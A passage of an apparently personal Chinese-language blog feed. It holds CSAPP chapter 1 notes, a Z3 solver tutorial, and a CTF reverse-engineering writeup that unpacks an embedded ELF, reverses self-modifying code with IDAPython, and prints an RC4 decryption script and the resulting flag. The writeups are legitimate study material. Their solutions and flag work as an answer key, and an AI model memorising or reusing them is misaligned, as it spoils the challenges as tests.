decrypt(<span class="built_in">bytes</span>(flag),<span class="string">&#x27;flag&#x27;</span>.encode()) flag就是四位数的key</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XXTEA-python-加密-解密脚本&quot;&gt;&lt;a href=&quot;#XXTEA-python-加密-解密脚本&quot; class=&quot;headerlink&quot; title=&quot;XXTEA python 加密/解密脚本&quot;&gt;&lt;/a&gt;XXTEA python 加密/解密脚本&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>csapp-pra1</title>
    <link href="http://example.com/2021/12/18/postcsapp-pra1/"/>
    <id>http://example.com/2021/12/18/postcsapp-pra1/</id>
    <published>2021-12-18T07:50:46.000Z</published>
    <updated>2021-12-18T08:51:40.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Starts"><a href="#Starts" class="headerlink" title="Starts"></a>Starts</h2><p>断断续续总算把csapp的第一章看完了，算是非常基础的介绍部分，介绍了很多计算机硬件的知识和常识，以及后面章节会涉及到的一些学习的内容。</p><h3 id="编译系统"><a href="#编译系统" class="headerlink" title="编译系统"></a>编译系统</h3><p>说实话，了解原理还算比较有趣的，从helloworld程序讲起。从源文件到编译成可执行目标文件需要经过四个阶段，分别由预处理器，编译器，汇编器，链接器，他们构成了编译系统。而我们需要去了解编译系统是如何工作的，这样才能够实现优化程序性能，理解链接时出现的错误，避免安全漏洞。里面会用到汇编，链接和算法的知识，在我们写程序时常常会有运行复杂和安全性的区别，了解编译系统是至关重要的。</p><h3 id="处理器读取解释指令"><a href="#处理器读取解释指令" class="headerlink" title="处理器读取解释指令"></a>处理器读取解释指令</h3><p>当编译结束后系统硬件需要工作来执行可执行文件。硬件组成由总线，I/O设备，主存，处理器。而执行在硬件里数据需要加载到主存，处理器执行机器语言指令，通过总线达到寄存器再存放到内存中。而运行中需要速度，所以引入了高速缓存的概念，采用高速缓存存储器L1L2L3多级访问可以实现程序性能的显著提高，存储器层次结构呈金字塔型，高速缓存和寄存器大大提高了存储的效率。</p><h3 id="操作系统（抽象）"><a href="#操作系统（抽象）" class="headerlink" title="操作系统（抽象）"></a>操作系统（抽象）</h3><p>操作系统管理硬件，防止硬件被失控的程序滥用，向应用程序提供简单已知的机制来控制复杂而又通常大不相同的低级硬件设备。</p><p>其中抽象概念十分重要，通过抽象概念来实现操作系统的功能，也是我们经常会听到的进程，虚拟内存和文件，实际上，文件是对I/O设备的抽象表示，虚拟内存是对主存和I/O设备的抽象表示，进程则是对处理器、主存和I/O设备的抽象表示。</p><p>在单处理器中实际上是在不断切换执行的进程。操作系统跟踪程序运行信息，而进程转换是由操作系统内核管理，例如读写程序需要执行sys call系统调用，给予内核控制权，结束后返回控制权，而实现进程需要硬件和软件的共同合作。</p><p>实际上进程中有并发和并行的概念，而线程级并发和指令级并行，超线程和多核处理器的出现也是提高系统性能的一大部分。线程即为控制流，多线程是现代提高程序运行程序的方式之一。虚拟内存是一种每个进程都在独占使用主存，被称为虚拟地址空间，其中有只读的代码和数据，堆，栈，共享库，内核虚拟内存等等，地址从低到高增大。文件即为字节序列，作为读写的源。</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>后面还多花了一些篇幅谈了并发和并行，以及抽象的重要性，和Amdahl定律（即加速比，想要提高整个系统的速度，需要提高全系统中相当大的部分的速度）。</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>系统漫游简略带我领略了一下计算机世界和我们可以在哪里来实现对程序等等计算机中的部件的运行的优化，更好的实现一个程序以及很多的更好的实现。或许不断完善和探究原理不仅是对一个系统，一个程序，一个计算机的要求，也应该是对自己的要求吧。</p><p>Waste It On Me.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Starts&quot;&gt;&lt;a href=&quot;#Starts&quot; class=&quot;headerlink&quot; title=&quot;Starts&quot;&gt;&lt;/a&gt;Starts&lt;/h2&gt;&lt;p&gt;断断续续总算把csapp的第一章看完了，算是非常基础的介绍部分，介绍了很多计算机硬件的知识和常识，以及后面章</summary>
      
    
    
    
    
    <category term="csapp" scheme="http://example.com/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>多个ELF文件分析处理与自解密IDApython使用</title>
    <link href="http://example.com/2021/12/15/%E5%A4%9A%E4%B8%AAELF%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%84%E7%90%86%E4%B8%8E%E8%87%AA%E8%A7%A3%E5%AF%86IDApython%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/12/15/%E5%A4%9A%E4%B8%AAELF%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%84%E7%90%86%E4%B8%8E%E8%87%AA%E8%A7%A3%E5%AF%86IDApython%E4%BD%BF%E7%94%A8/</id>
    <published>2021-12-15T06:33:18.000Z</published>
    <updated>2021-12-19T08:19:08.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="starts"><a href="#starts" class="headerlink" title="starts"></a>starts</h2><p>这篇其实是对normal11的wp的一个复现，因为学习到了很多没接触过的东西所以想做一个归纳，以后查看的时候也比较方便。wp写的比较简略，只是给了一个大致的思路，需要搞懂还是要手操一遍才会发现自己哪里不会。</p><h2 id="多可执行文件的分析处理"><a href="#多可执行文件的分析处理" class="headerlink" title="多可执行文件的分析处理"></a>多可执行文件的分析处理</h2><p>首先是关键代码不在main里面，main函数里有很复杂的代码，看起来并不像关键代码。这里可以在start开始下断点然后跟进看会先走哪里。跟着wp查看init（main）函数前调用的函数，点进去看调用了一个可疑函数sub_400976，然后通过问和查资料了解了一下这段代码的意思。</p><img src="/2021/12/15/%E5%A4%9A%E4%B8%AAELF%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%84%E7%90%86%E4%B8%8E%E8%87%AA%E8%A7%A3%E5%AF%86IDApython%E4%BD%BF%E7%94%A8/2.png" class="" width="2"><p>就是从结尾开始读取12936个字节，当作文件运行。也就是这个文件里有两个可执行文件（ELF).可以使用winhex来把第二个ELF文件抠出来，单独分析。把文件拖进winhex里，从ELF头选中整个文件，右击编辑另存为到新的文件里。</p><h2 id="SMC自解密与IDApython的使用"><a href="#SMC自解密与IDApython的使用" class="headerlink" title="SMC自解密与IDApython的使用"></a>SMC自解密与IDApython的使用</h2><p>重新使用ida查看新生成的文件的关键代码这时候就能看到一个SMC自解密，即为这个encrypt。</p><img src="/2021/12/15/%E5%A4%9A%E4%B8%AAELF%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%84%E7%90%86%E4%B8%8E%E8%87%AA%E8%A7%A3%E5%AF%86IDApython%E4%BD%BF%E7%94%A8/1.png" class="" width="1"><p>上网查了一下什么是SMC自解密。即<strong>自修改代码</strong>，简而言之就是程序中的部分代码在运行前是被加密成一段数据，不可反编译，通过程序运行后执行相关解码代功能，对加密的代码数据进行解密，让其恢复正常功能。这里使用idapython来进行解密。wp里的idapython指令是ida7.5以前的指令版本，我这里使用的是ida7.6，所以不能使用旧版的指令，顺带学习了一下idapython的使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0xAF0</span> <span class="comment">#encrypt的地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">310</span>):</span><br><span class="line">    ida_bytes.patch_byte(addr+i+<span class="number">20</span>,idc.get_wide_byte(addr+i+<span class="number">20</span>)^i)</span><br><span class="line"><span class="comment">#idc.get_wide_byte(addr)：以字节为单位获取地址处的值，旧版中为Byte(addr)</span></span><br><span class="line"><span class="comment">#修改指令的值：ida_bytes.patch_byte(addr,value)(addr,value)：修改addr地址的值为value.每次修改一个字节</span></span><br></pre></td></tr></table></figure><p>详细了解idapython这些的用法可以看看这一篇</p><p><a href="https://www.cnblogs.com/iBinary/p/14642662.html">https://www.cnblogs.com/iBinary/p/14642662.html</a></p><p>IDApython run后查看汇编，这里还有一个字节（地址：B14）影响了反编译，把这个字节nop掉。</p><p>对encrypt函数按P从当前地址处解析成函数，再按U解析成未定义的内容。就可以成功反编译代码了，就是一个rc4加密，密文和密钥都给清楚了，还是比较容易分析的。但离谱的是wp的脚本竟然是用c写的，这时候一定要用py整个脚本自己写出来。</p><h2 id="RC4解密"><a href="#RC4解密" class="headerlink" title="RC4解密"></a>RC4解密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;hgame!@#&#x27;</span></span><br><span class="line">T = [key[i%<span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">S = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">text_lenth = <span class="number">27</span></span><br><span class="line">key_list = []</span><br><span class="line">text = [<span class="number">67</span>,<span class="number">36</span>,-<span class="number">27</span>,-<span class="number">95</span>,-<span class="number">59</span>,<span class="number">29</span>,<span class="number">114</span>,-<span class="number">46</span>,<span class="number">40</span>,-<span class="number">17</span>,-<span class="number">66</span>,-<span class="number">22</span>,-<span class="number">91</span>,-<span class="number">105</span>,<span class="number">68</span>,<span class="number">96</span>,-<span class="number">39</span>,<span class="number">15</span>,<span class="number">44</span>,<span class="number">111</span>,<span class="number">94</span>,<span class="number">38</span>,-<span class="number">77</span>,<span class="number">10</span>,-<span class="number">4</span>,-<span class="number">44</span>,-<span class="number">77</span>]</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">    temp = S[j]</span><br><span class="line">    S[j] = S[i]</span><br><span class="line">    S[i] = temp</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(text_lenth):</span><br><span class="line">    i = (i+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j+S[i]) % <span class="number">256</span></span><br><span class="line">    temp = S[j]</span><br><span class="line">    S[j] = S[i]</span><br><span class="line">    S[i] = temp</span><br><span class="line">    t = (S[i]+S[j]) % <span class="number">256</span></span><br><span class="line">    key_list.append(S[t])</span><br><span class="line"></span><br><span class="line">ciphertext = [text[i]^key_list[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    ciphertext[i] &amp;= <span class="number">0xff</span> <span class="comment">#因为这里计算出的ciphertext明文是负数，想要转化成chr必须进行高位清零，不然会报错</span></span><br><span class="line">ciphertext = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(ciphertext))</span><br></pre></td></tr></table></figure><p>flag：hgame{th1s_f4ke_re4l_w0rld}</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>知识在题目里会越来越综合着去使用，每次都要把东西搞清楚记下来捏。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;starts&quot;&gt;&lt;a href=&quot;#starts&quot; class=&quot;headerlink&quot; title=&quot;starts&quot;&gt;&lt;/a&gt;starts&lt;/h2&gt;&lt;p&gt;这篇其实是对normal11的wp的一个复现，因为学习到了很多没接触过的东西所以想做一个归纳，以后查看的时候</summary>
      
    
    
    
    
    <category term="归纳" scheme="http://example.com/tags/%E5%BD%92%E7%BA%B3/"/>
    
  </entry>
  
  <entry>
    <title>Z3约束求解器</title>
    <link href="http://example.com/2021/12/13/Z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E5%99%A8/"/>
    <id>http://example.com/2021/12/13/Z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E5%99%A8/</id>
    <published>2021-12-13T13:48:07.000Z</published>
    <updated>2021-12-14T12:24:55.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="starts"><a href="#starts" class="headerlink" title="starts"></a>starts</h2><p>一直不会用z3，但是爆破里面经常会需要z3来一把梭，主要是在类型转换时里面经常有个a开头的类型搞我，给我整寄了。直到现在从normal题再一次做起又碰到z3的时候想起来还是需要学习一下，这次找到了一篇比较详细的讲解。</p><h2 id="Z3约束求解器"><a href="#Z3约束求解器" class="headerlink" title="Z3约束求解器"></a>Z3约束求解器</h2><p>安装z3模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><p>在使用z3时，开头需要这样一行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h2 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h2><p>一般来使用z3大多数都会有位运算，所以一般就不用管Real（实数）和Int（整数），直接把变量设置成向量型就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个 16 位的变量</span></span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 声明多个 16 位的变量</span></span><br><span class="line">y,z = BitVecs(<span class="string">&#x27;y z&#x27;</span>,<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>然后我们在z3里一般都会使用很多变量，需要快速添加变量。</p><p>添加 50 个 16 位 BitVec 变量 s ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=[BitVec (<span class="string">&#x27;s%d&#x27;</span> % i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)] <span class="comment">#声明一个列表，数据类型是向量，向量的大小是16位</span></span><br><span class="line">flag = [BitVec(<span class="string">&#x27;%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)] <span class="comment">#声名一个列表，数据类型是向量，大小是8位</span></span><br></pre></td></tr></table></figure><h2 id="创建约束求解器"><a href="#创建约束求解器" class="headerlink" title="创建约束求解器"></a>创建约束求解器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br></pre></td></tr></table></figure><h2 id="添加约束条件"><a href="#添加约束条件" class="headerlink" title="添加约束条件"></a>添加约束条件</h2><p>以行为单位添加方程等式样子的约束条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.add(x**<span class="number">2</span>+y**<span class="number">2</span>==<span class="number">74</span>)</span><br><span class="line">s.add(x**<span class="number">5</span>-y==z)</span><br><span class="line"><span class="comment"># [y = -7, x = 5, z = 3132]</span></span><br></pre></td></tr></table></figure><p>这里注意，z3不允许列表与列表之间添加==约束条件，会报错。</p><h2 id="判断是否有解"><a href="#判断是否有解" class="headerlink" title="判断是否有解"></a>判断是否有解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> s.check() == sat:  <span class="comment">#检查是否有解</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;solver&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no solver&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="求解并输出"><a href="#求解并输出" class="headerlink" title="求解并输出"></a>求解并输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ans = s.model() <span class="comment">#求解</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h2 id="TIP"><a href="#TIP" class="headerlink" title="TIP"></a>TIP</h2><p>一般来说经常会使用z3来爆破，求解flag时需要将变量约束在可见字符的ascii码之内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.add(x &lt; <span class="number">127</span>)</span><br><span class="line">s.add(x &gt;= <span class="number">32</span>)</span><br></pre></td></tr></table></figure><p>在约束条件时最好使用下标索引，用列表来管理（可以使输出是有序的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.add(s[<span class="number">18</span>] * s[<span class="number">8</span>] == <span class="number">5</span>)</span><br><span class="line">s.add(s[<span class="number">4</span>] * s[<span class="number">11</span>] == <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>求解打印结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">answer=s.model() <span class="comment">#求解</span></span><br><span class="line"><span class="comment">#print(answer)</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(answer[i]) <span class="keyword">for</span> i <span class="keyword">in</span> s]) <span class="comment">#连接</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="z3-ArithRef"><a href="#z3-ArithRef" class="headerlink" title="z3.ArithRef"></a>z3.ArithRef</h2><p>这个arithref，应该一开始使用z3的都会收到一个类型转换的报错。这是一个z3的特有变量类型，即使求解成功，也不能直接将这个类型的变量输出，在这里我们需要将变量进行类型转换才能成功的输出我们想要的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m = s.model()</span><br><span class="line"><span class="comment"># 输出为int类型</span></span><br><span class="line">a_int = m[a].as_long()</span><br><span class="line"><span class="comment"># 输出为fraction类型</span></span><br><span class="line">d_float = m[d].as_fraction()</span><br></pre></td></tr></table></figure><p>fraction类型的数据可以直接转换成float类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">float</span>(d_float)</span><br><span class="line">Out[<span class="number">31</span>]: <span class="number">3.0</span></span><br></pre></td></tr></table></figure><p>一般来说不会整那些精度活，如果输出无理数那也没法转化成chr类型了，如果有那种报错在题里一般都是自己写错了，检查一下思路和数据。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>贴个normal8上去捏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">key = [<span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000009</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000006</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000007</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">str1 = [<span class="number">0x0000007A</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000008C</span>, <span class="number">0x00000095</span>, <span class="number">0x0000008E</span>, <span class="number">0x000000A8</span>, <span class="number">0x0000005F</span>, <span class="number">0x000000C9</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000091</span>, <span class="number">0x00000088</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000070</span>, <span class="number">0x000000C0</span>, <span class="number">0x0000007F</span>, <span class="number">0x00000089</span>, <span class="number">0x00000086</span>, <span class="number">0x00000093</span>, <span class="number">0x0000005F</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000086</span>, <span class="number">0x00000085</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000088</span>, <span class="number">0x000000D4</span>, <span class="number">0x000000A0</span>, <span class="number">0x000000A2</span>, <span class="number">0x00000098</span>, <span class="number">0x000000B3</span>, <span class="number">0x00000079</span>, <span class="number">0x000000C1</span>, <span class="number">0x0000007E</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000077</span>, <span class="number">0x00000093</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">str2 = [<span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000005</span>, <span class="number">0x00000017</span>, <span class="number">0x00000005</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000017</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000017</span>, <span class="number">0x00000013</span>, <span class="number">0x00000007</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000016</span>, <span class="number">0x00000011</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000016</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000009</span>, <span class="number">0x00000005</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000D</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">&#x27;%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)]</span><br><span class="line">flag1 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">flag2 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">str_1 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">str_2 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    s.add(flag[i] &lt; <span class="number">127</span>)</span><br><span class="line">    s.add(flag[i] &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">flag1 = [(i &gt;&gt; <span class="number">4</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">flag2 = [(i &amp; <span class="number">0xf</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            str_1[<span class="number">6</span> * i + j] += flag1[<span class="number">6</span> * i + k] * key[<span class="number">6</span> * k + j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        str_2[<span class="number">6</span> * i + j] += flag2[<span class="number">6</span> * i + j] + key[<span class="number">6</span> * i + j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    s.add(str_1[i] == str1[i])</span><br><span class="line">    s.add(str_2[i] == str2[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    y = s.model()</span><br><span class="line">    flag_ =  [<span class="built_in">chr</span>(y[flag[i]].as_long().real) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag_))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>希望下次能自己写个出数据且不报错的z3（双手合十</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;starts&quot;&gt;&lt;a href=&quot;#starts&quot; class=&quot;headerlink&quot; title=&quot;starts&quot;&gt;&lt;/a&gt;starts&lt;/h2&gt;&lt;p&gt;一直不会用z3，但是爆破里面经常会需要z3来一把梭，主要是在类型转换时里面经常有个a开头的类型搞我，给我整寄</summary>
      
    
    
    
    
    <category term="0-1のpython" scheme="http://example.com/tags/0-1%E3%81%AEpython/"/>
    
  </entry>
  
  <entry>
    <title>符号位扩展</title>
    <link href="http://example.com/2021/12/12/movzx-movsz/"/>
    <id>http://example.com/2021/12/12/movzx-movsz/</id>
    <published>2021-12-12T07:24:34.000Z</published>
    <updated>2021-12-12T14:15:32.632Z</updated>
    
